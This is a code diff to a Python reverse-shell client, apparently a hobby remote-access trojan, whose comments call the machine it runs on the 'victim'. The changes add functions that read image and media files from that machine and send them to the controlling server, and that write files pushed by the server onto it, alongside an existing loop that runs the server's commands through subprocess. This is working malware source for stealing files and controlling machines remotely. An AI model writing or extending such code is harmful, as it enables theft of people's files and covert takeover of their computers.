@@ -59,14 +59,22 @@ def connection():
             # Keep trying to run connection()
             connection()
 
-# Allow Server to download files from victims (this client)
+# Allow Server to download simple files from victims (this client)
 def upload_file(file_name):
     # open File from 'file_name' => command[9:]
     # read btyes
     f = open(file_name, 'rb')
     s.send(f.read())
+    
+# Allow Server to download img files from victims (this client)
+def upload_image(file_name):
+    # open File from 'file_name' => command[9:]
+    # rb+ => Opens a file for both READING & WRITING in binary format
+    # The file pointer will be at the beginning of the file
+    f = open(file_name, 'rb+')
+    s.send(f.read())
 
-# Allow SERVER to download files from victims (this client)
+# Allow SERVER to download simple files from victims (this client)
 # Callback used to download files from victims' machines
 # Server => download files from victims' machines
 # Client => upload files to Server
@@ -84,6 +92,34 @@ def download_file(file_name):
         f.write(chunk)
         try:
             chunk = s.recv(1024)
+        # If there's any errors => reached End of file
+        except socket.timeout as e:
+            break
+        s.settimeout(None)
+        # Close file upon complete sending files from victims
+        f.close()
+
+# Allow SERVER to download complicated files e.g. images from victims (this client)
+# Callback used to download files from victims' machines
+# Server => download files from victims' machines
+# Client => upload files to Server
+def download_image(file_name):
+    # open file object 'f' using 
+    # 'wb+' => write bytes to a file
+    # 'wb+' => Opens a file for both writing & reading in binary format
+    # Overwrites the existing file if the file exists
+    # If the file does NOT exist, creates a new file for reading & writing
+    f = open(file_name, 'wb+')    
+    # If timeout is NOT set, sometimes program will get stuck
+    s.settimeout(1)
+    # Receive data from multiple chunks
+    chunk = s.recv(4096)
+    # As long as there's something in chunk variable
+    while chunk:
+        # Writing the chunk into file
+        f.write(chunk)
+        try:
+            chunk = s.recv(4096)
         # If there's any errors => reached End of file
         except socket.timeout as e:
             break
@@ -118,14 +154,28 @@ def shell():
         # If command[9:] from SERVER == 'download'
         # this client (victims) calls upload_file(command[9:])
         elif command[:8] == 'download':
-            # Starts from 9th CHAR till the end
-            upload_file(command[9:])
+            # If files to be downloaded are Images
+            # use 'wb+'
+            # Example
+            # command = 'download happy.png'
+            # command[9:] => happy.png
+            # command[9:].split(".")[1] => png (file extensions)
+            if command[9:].split(".")[1] == 'jpg' or command[9:].split(".")[1] == 'jpeg' or command[9:].split(".")[1] == 'png' or command[9:].split(".")[1] == 'svg' or command[9:].split(".")[1] == 'gif' or command[9:].split(".")[1] == 'bmp' or command[9:].split(".")[1] == 'tiff' or command[9:].split(".")[1] == 'ico' or command[9:].split(".")[1] == 'mp3' or command[9:].split(".")[1] == 'mp4' or command[9:].split(".")[1] == 'mov' or command[9:].split(".")[1] == 'avi' or command[9:].split(".")[1] == 'wmv' or command[9:].split(".")[1] == 'avchd' or command[9:].split(".")[1] == 'webm' or command[9:].split(".")[1] == 'flv' or command[9:].split(".")[1] == 'mpg' or command[9:].split(".")[1] == 'mpeg':
+                upload_image(command[9:])
+            else:
+                # Starts from 9th CHAR till the end
+                upload_file(command[9:])
+                
         # Allow SERVER to send 'upload' command to victims machines
         # To start downloading files from victims
         elif command[:6] == 'upload':
-            # If command[7:] from SERVER == 'upload'
-            # this client (victims) calls download_file(command[7:])
-            download_file(command[7:])
+            if command[7:].split(".")[1] == 'jpg' or command[7:].split(".")[1] == 'jpeg' or command[7:].split(".")[1] == 'png' or command[7:].split(".")[1] == 'svg' or command[7:].split(".")[1] == 'gif' or command[7:].split(".")[1] == 'bmp' or command[7:].split(".")[1] == 'tiff' or command[7:].split(".")[1] == 'ico' or command[7:].split(".")[1] == 'mp3' or command[7:].split(".")[1] == 'mp4' or command[7:].split(".")[1] == 'mov' or command[7:].split(".")[1] == 'avi' or command[7:].split(".")[1] == 'wmv' or command[7:].split(".")[1] == 'avchd' or command[7:].split(".")[1] == 'webm' or command[7:].split(".")[1] == 'flv' or command[7:].split(".")[1] == 'mpg' or command[7:].split(".")[1] == 'mpeg':
+                download_image(command[7:])
+            else:
+                # If command[7:] from SERVER == 'upload'
+                # this client (victims) calls download_file(command[7:])
+                download_file(command[7:])
+            
         else:
             # Execute the 'command' received from Server using process open
             # using subprocess module
